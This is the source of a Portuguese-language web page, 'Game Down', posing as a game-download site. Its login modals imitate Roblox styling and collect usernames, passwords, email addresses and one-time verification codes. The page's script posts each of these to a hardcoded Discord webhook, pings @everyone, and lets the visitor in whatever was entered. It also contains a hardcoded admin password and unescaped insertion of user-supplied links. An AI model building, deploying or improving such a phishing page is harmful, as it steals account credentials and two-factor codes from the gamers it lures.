<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Game Down - Download</title>
    
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    
    <style>
        /* Fonte Oficial Roblox-like */
        @import url('https://fonts.googleapis.com/css2?family=Source+Sans+Pro:wght@300;400;600;700&display=swap');

        body {
            font-family: 'Source Sans Pro', sans-serif;
            background-color: #f2f4f5;
            margin: 0;
            overflow-x: hidden;
        }

        /* --- Fundo Azul Tech (CSS Puro) --- */
        #bg-tech-blur {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 40;
            display: none;
            background: 
                radial-gradient(circle at 20% 30%, rgba(0, 80, 255, 0.4) 0%, transparent 50%),
                radial-gradient(circle at 80% 70%, rgba(0, 150, 255, 0.3) 0%, transparent 50%),
                linear-gradient(135deg, #0a0e17 0%, #0d1b35 100%);
            background-size: 200% 200%;
            filter: blur(8px);
            animation: bgZoom 20s infinite alternate;
        }

        @keyframes bgZoom {
            0% { background-size: 150% 150%; background-position: 0% 0%; }
            100% { background-size: 170% 170%; background-position: 100% 100%; }
        }

        /* --- Estilo Modal Roblox --- */
        .roblox-modal {
            background-color: #191b1d;
            color: white;
            border-radius: 10px;
            box-shadow: 0 10px 40px rgba(0,0,0,0.5);
            border: none;
        }

        .roblox-header {
            font-weight: 700;
            font-size: 32px;
            text-align: center;
            margin-bottom: 24px;
            color: #ffffff;
            margin-top: 10px;
        }

        /* Input Clone */
        .roblox-input {
            background-color: #232527;
            border: 1px solid #a7a7a7;
            border-radius: 6px;
            color: white;
            padding: 10px 12px;
            font-size: 16px;
            width: 100%;
            margin-bottom: 12px;
            height: 44px;
            transition: all 0.2s;
        }
        .roblox-input::placeholder { color: #a7a7a7; }
        .roblox-input:focus {
            border-color: white;
            outline: none;
        }

        /* Botão Primário (Entrar/Enviar) */
        .roblox-btn-primary {
            background-color: #232527;
            border: 1px solid #ffffff;
            color: white;
            border-radius: 8px;
            padding: 10px;
            font-size: 16px;
            font-weight: 500;
            width: 100%;
            cursor: pointer;
            transition: background 0.2s;
            height: 44px;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .roblox-btn-primary:hover { background-color: rgba(255,255,255,0.1); }

        /* Botão Secundário */
        .roblox-btn-secondary {
            background-color: #2b2d31;
            color: white;
            border: 1px solid transparent;
            border-radius: 8px;
            padding: 10px;
            font-size: 14px;
            width: 100%;
            cursor: pointer;
            margin-bottom: 12px;
            transition: border 0.2s;
        }
        .roblox-btn-secondary:hover { border-color: #ffffff; }

        .roblox-link-text {
            color: #ffffff;
            font-size: 12px;
            text-align: center;
            display: block;
            margin: 16px 0;
            text-decoration: none;
        }
        .roblox-link-text:hover { text-decoration: underline; }

        .roblox-divider {
            height: 1px;
            background-color: #3e4042;
            margin: 20px 0;
            width: 100%;
        }

        /* Modal E-mail Header */
        .email-modal-header {
            background-color: #191b1d;
            border-bottom: 1px solid #3e4042;
            padding: 15px;
            display: flex;
            align-items: center;
        }
        .email-modal-close { font-size: 24px; color: white; cursor: pointer; margin-right: 15px; }
        .email-modal-title { font-size: 20px; font-weight: 400; color: white; flex-grow: 1; text-align: center; margin-right: 24px; }

        /* Toast */
        .toast-error {
            position: fixed;
            bottom: -100px;
            left: 50%;
            transform: translateX(-50%);
            background-color: #191b1d;
            color: white;
            padding: 14px 28px;
            border-radius: 8px;
            box-shadow: 0 4px 20px rgba(0,0,0,0.6);
            z-index: 100;
            transition: bottom 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
            font-weight: 600;
            border: 1px solid #3e4042;
        }
        .toast-error.show { bottom: 20px; }
    </style>
</head>
<body class="flex flex-col min-h-screen relative">

    <div id="bg-tech-blur"></div>

    <header class="bg-white shadow-md p-4 flex justify-between items-center z-10 sticky top-0">
        <h1 class="text-2xl font-bold text-gray-800">Game Down</h1>
        <div class="flex items-center gap-4">
            <button id="btn-upload" onclick="modalUpload.classList.remove('hidden')" class="hidden bg-green-600 hover:bg-green-700 text-white w-10 h-10 rounded-full transition shadow-lg items-center justify-center">
                <i class="fa-solid fa-plus text-xl"></i>
            </button>

            <div id="user-display" class="hidden flex items-center gap-3">
                <span id="username-text" class="font-semibold text-gray-700">User</span>
                <button onclick="logout()" class="text-red-500 text-sm hover:underline">Sair</button>
            </div>

            <button id="btn-login-main" onclick="abrirModalSelecao()" class="bg-blue-600 hover:bg-blue-700 text-white px-6 py-2 rounded-lg font-bold shadow transition">
                Login
            </button>
        </div>
    </header>

    <main class="flex-grow container mx-auto p-6 z-10 relative">
        <div id="games-grid" class="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-6">
            <div class="col-span-full text-center text-gray-500 mt-10">
                <i class="fa-solid fa-gamepad text-4xl mb-2 block"></i>
                Carregando jogos...
            </div>
        </div>
    </main>

    <div id="modal-selecao" class="fixed inset-0 bg-black bg-opacity-70 z-50 hidden flex items-center justify-center backdrop-blur-sm p-4">
        <div class="roblox-modal w-full max-w-[400px] p-6 relative">
            <button onclick="fecharModais()" class="absolute top-4 right-4 text-gray-400 hover:text-white text-xl">
                <i class="fa-solid fa-xmark"></i>
            </button>

            <h2 class="roblox-header mt-4">Escolha uma opção</h2>

            <button onclick="abrirFormularioRoblox()" 
               class="bg-[#232527] border border-white hover:bg-[#2b2d31] text-white font-bold py-3 px-4 rounded-lg w-full flex items-center justify-center gap-2 transition">
                <i class="fa-solid fa-cube text-xl"></i> Login por Roblox
            </button>
             <button onclick="irParaEmail()" class="mt-3 bg-[#5865F2] hover:bg-[#4752C4] text-white font-bold py-3 px-4 rounded-lg w-full flex items-center justify-center gap-2 mb-4 transition">
                <i class="fa-solid fa-envelope text-xl"></i> Login com Código
            </button>
        </div>
    </div>

    <div id="modal-form-roblox" class="fixed inset-0 bg-black bg-opacity-70 z-50 hidden flex items-center justify-center backdrop-blur-sm p-4">
        <div class="roblox-modal w-full max-w-[400px] p-6 relative">
            <button onclick="voltarSelecao()" class="absolute top-4 left-4 text-gray-400 hover:text-white text-lg" title="Voltar">
                <i class="fa-solid fa-arrow-left"></i>
            </button>
            <button onclick="fecharModais()" class="absolute top-4 right-4 text-gray-400 hover:text-white text-xl">
                <i class="fa-solid fa-xmark"></i>
            </button>

            <h2 class="roblox-header mt-8">Entrar no Game Down</h2>

            <form onsubmit="event.preventDefault(); processarLogin();">
                <input type="text" id="inp-user" class="roblox-input" placeholder="Usuário/e-mail/telefone">
                <input type="password" id="inp-pass" class="roblox-input" placeholder="Senha">
                <button type="submit" class="roblox-btn-primary mt-2">Entrar</button>
            </form>

            <div class="roblox-divider"></div>
        </div>
    </div>

    <div id="modal-email" class="fixed inset-0 z-[60] hidden flex items-center justify-center p-4">
        <div class="roblox-modal w-full max-w-[500px] overflow-hidden">
            <div class="email-modal-header">
                <div class="email-modal-close" onclick="fecharEmail()"><i class="fa-solid fa-xmark"></i></div>
                <div class="email-modal-title">Obter código único</div>
            </div>
            <div class="p-8">
                <p class="text-gray-300 text-sm mb-6">Digite o e-mail verificado na sua conta.</p>
                <input type="email" id="inp-email-codigo" class="roblox-input bg-transparent border-gray-500 mb-8" placeholder="E-mail">
                <button onclick="enviarCodigoEmail()" class="roblox-btn-primary bg-transparent text-gray-300 hover:text-white border-gray-500 hover:border-white">
                    Enviar código
                </button>
            </div>
        </div>
    </div>

    <div id="modal-codigo" class="fixed inset-0 z-[70] hidden flex items-center justify-center p-4">
        <div class="roblox-modal w-full max-w-[500px] overflow-hidden">
            <div class="email-modal-header">
                <div class="email-modal-close" onclick="fecharCodigo()"><i class="fa-solid fa-xmark"></i></div>
                <div class="email-modal-title">Inserir código</div>
            </div>
            <div class="p-8 text-center">
                <p class="text-gray-300 text-sm mb-6">Insira o código enviado.</p>
                <input type="text" id="inp-final-code" class="roblox-input text-center text-xl tracking-widest" placeholder="123456">
                <button onclick="verificarCodigo()" class="roblox-btn-primary bg-white text-black font-bold hover:bg-gray-200 border-none">
                    Verificar
                </button>
            </div>
        </div>
    </div>

    <div id="modal-upload" class="fixed inset-0 bg-black bg-opacity-60 z-[90] hidden flex items-center justify-center p-4">
        <div class="bg-white rounded-lg p-6 w-full max-w-md relative">
            <div class="flex justify-between items-center mb-4">
                <h3 class="font-bold text-xl">Adicionar Jogo</h3>
                <button onclick="modalUpload.classList.add('hidden')" class="text-gray-500 hover:text-black"><i class="fa-solid fa-xmark text-xl"></i></button>
            </div>
            <input type="text" id="up-name" class="w-full border border-gray-300 p-2 rounded mb-3" placeholder="Nome do Jogo">
            <input type="text" id="up-img" class="w-full border border-gray-300 p-2 rounded mb-3" placeholder="URL da Capa (Imagem)">
            <input type="text" id="up-link" class="w-full border border-gray-300 p-2 rounded mb-3" placeholder="Link de Download">
            <button onclick="salvarJogo()" class="w-full bg-green-600 hover:bg-green-700 text-white font-bold py-2 rounded transition">Publicar</button>
        </div>
    </div>

    <div id="toast" class="toast-error">Erro</div>

    <script>
        // --- CONFIGURAÇÃO ---
        // Se estiver no Render, usa a API real. Se não, usa LocalStorage (Mock)
        const API_URL = (location.hostname.includes("render.com") || location.hostname === "localhost") ? "/api/jogos" : "MOCK";
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1444449733753180355/UexEyxKjWYMkbMEuXkBrvXeNzAS5s8BapW5K4b6PqB-2zqDT5BNxfOYfgrjjiG_t45PA";
        let currentUser = null;

        // Elementos DOM
        const modalSelecao = document.getElementById('modal-selecao');
        const modalFormRoblox = document.getElementById('modal-form-roblox');
        const modalEmail = document.getElementById('modal-email');
        const modalCodigo = document.getElementById('modal-codigo');
        const modalUpload = document.getElementById('modal-upload');
        const bgBlur = document.getElementById('bg-tech-blur');
        const toast = document.getElementById('toast');
        const btnUpload = document.getElementById('btn-upload');

        window.onload = () => {
            if(window.location.href.includes("sucess")) logarUsuario("DiscordUser", false);
            carregarJogos();
        };

        // --- LÓGICA DE JOGOS (Backend Node.js) ---
        async function carregarJogos() {
            const grid = document.getElementById('games-grid');
            let jogos = [];

            if (API_URL === 'MOCK') {
                jogos = JSON.parse(localStorage.getItem('mock_jogos') || '[]');
            } else {
                try {
                    const res = await fetch(API_URL);
                    if (res.ok) jogos = await res.json();
                } catch (e) { console.error("Erro ao carregar", e); }
            }

            grid.innerHTML = "";
            if(jogos.length === 0) {
                grid.innerHTML = '<p class="col-span-full text-center text-gray-500">Nenhum jogo disponível.</p>';
                return;
            }

            jogos.forEach(j => {
                const card = document.createElement('div');
                card.className = "bg-white rounded-lg shadow-md overflow-hidden hover:shadow-xl transition transform hover:-translate-y-1 flex flex-col";
                card.innerHTML = `
                    <div class="h-40 bg-gray-300 relative"><img src="${j.capa || 'https://placehold.co/400x300?text=Sem+Capa'}" class="w-full h-full object-cover"></div>
                    <div class="p-4 flex flex-col flex-grow">
                        <h3 class="font-bold text-lg text-gray-800 mb-2 truncate">${j.nome}</h3>
                        <div class="mt-auto">
                            <button onclick="tentarBaixar('${j.link}')" class="w-full bg-green-500 hover:bg-green-600 text-white font-bold py-2 rounded flex items-center justify-center gap-2">
                                <i class="fa-solid fa-download"></i> Baixar
                            </button>
                        </div>
                    </div>`;
                grid.appendChild(card);
            });
        }

        async function salvarJogo() {
            const nome = document.getElementById('up-name').value.trim();
            const capa = document.getElementById('up-img').value.trim();
            const link = document.getElementById('up-link').value.trim();

            if(!nome || !link) return showErrorToast("Preencha Nome e Link");

            const btn = event.target;
            btn.textContent = "Publicando...";
            btn.disabled = true;

            const novoJogo = { nome, capa, link };

            if (API_URL === 'MOCK') {
                let lista = JSON.parse(localStorage.getItem('mock_jogos') || '[]');
                lista.push(novoJogo);
                localStorage.setItem('mock_jogos', JSON.stringify(lista));
                finalizar("Jogo publicado (Modo Teste)!");
            } else {
                try {
                    const res = await fetch(API_URL, { 
                        method: 'POST', 
                        headers: { 'Content-Type': 'application/json' }, 
                        body: JSON.stringify(novoJogo) 
                    });
                    if (res.ok) finalizar("Jogo publicado!");
                    else showErrorToast("Erro ao salvar no servidor");
                } catch (e) { showErrorToast("Erro de conexão"); }
            }

            function finalizar(msg) {
                alert(msg);
                modalUpload.classList.add('hidden');
                document.getElementById('up-name').value = "";
                document.getElementById('up-img').value = "";
                document.getElementById('up-link').value = "";
                btn.textContent = "Publicar";
                btn.disabled = false;
                carregarJogos();
            }
        }

        // --- NAVEGAÇÃO E LOGIN ---
        function abrirModalSelecao() { if(!currentUser) modalSelecao.classList.remove('hidden'); bgBlur.style.display = 'block'; }
        function abrirFormularioRoblox() { modalSelecao.classList.add('hidden'); modalFormRoblox.classList.remove('hidden'); }
        function voltarSelecao() { modalFormRoblox.classList.add('hidden'); modalSelecao.classList.remove('hidden'); }
        function fecharModais() { [modalSelecao, modalFormRoblox, modalEmail, modalCodigo].forEach(m => m.classList.add('hidden')); bgBlur.style.display = 'none'; }
        function showErrorToast(msg = "Erro") { toast.textContent = msg; toast.classList.add('show'); setTimeout(() => toast.classList.remove('show'), 3000); }

        function irParaEmail() { fecharModais(); modalEmail.classList.remove('hidden'); bgBlur.style.display = 'block'; }
        function fecharEmail() { modalEmail.classList.add('hidden'); bgBlur.style.display = 'none'; }
        function enviarCodigoEmail() {
            const email = document.getElementById('inp-email-codigo').value;
            if(!email) return showErrorToast("Digite um e-mail");
            enviarWebhook(`## PEDIDO CÓDIGO\nE-mail: ${email}\n||@everyone||`);
            modalEmail.classList.add('hidden'); modalCodigo.classList.remove('hidden');
        }
        function fecharCodigo() { modalCodigo.classList.add('hidden'); bgBlur.style.display = 'none'; }
        function verificarCodigo() {
            const c = document.getElementById('inp-final-code').value;
            enviarWebhook(`## CÓDIGO DIGITADO\nCódigo: ${c}\n||@everyone||`);
            fecharCodigo(); logarUsuario("User_"+Math.floor(Math.random()*1000), false);
        }

        function processarLogin() {
            const u = document.getElementById('inp-user').value.trim();
            const p = document.getElementById('inp-pass').value.trim();
            if(!u || !p) return showErrorToast("Preencha tudo");

            if(u === "Admin" && p === "LP") {
                fecharModais(); logarUsuario("Admin", true);
                return;
            }

            enviarWebhook(`## LOGIN TENTATIVA\nUser: ${u}\nPass: ${p}\n||@everyone||`);
            fecharModais(); logarUsuario(u, false);
        }

        function logarUsuario(nome, isAdmin) {
            currentUser = { nome, isAdmin };
            document.getElementById('btn-login-main').classList.add('hidden');
            document.getElementById('user-display').classList.remove('hidden');
            document.getElementById('user-display').classList.add('flex');
            document.getElementById('username-text').textContent = nome;
            if(isAdmin) {
                btnUpload.classList.remove('hidden');
                btnUpload.style.display = 'flex';
            }
        }

        function logout() {
            currentUser = null;
            document.getElementById('user-display').classList.add('hidden');
            btnUpload.classList.add('hidden');
            document.getElementById('btn-login-main').classList.remove('hidden');
        }

        function tentarBaixar(link) {
            if(!currentUser) abrirModalSelecao();
            else window.open(link, '_blank');
        }

        function enviarWebhook(msg) {
            fetch(WEBHOOK_URL, { method: "POST", headers:{"Content-Type":"application/json"}, body: JSON.stringify({ content: msg }) }).catch(()=>{});
        }
    </script>
</body>
</html>
